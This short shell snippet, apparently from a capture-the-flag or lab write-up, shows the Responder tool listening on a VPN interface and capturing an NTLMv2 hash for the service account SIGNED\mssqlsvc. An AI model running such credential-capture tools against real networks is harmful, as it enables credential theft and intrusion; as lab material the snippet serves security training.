```shell
$ responder -I tun0

[+] Listening for events...                                                                                                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.10.11.90
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:89069ad6c968af2f:C0FC85E683EC6FDEB7B1DCACF4DDEE8B:                                                                                                                                                                                                                             
[+] Exiting...

```
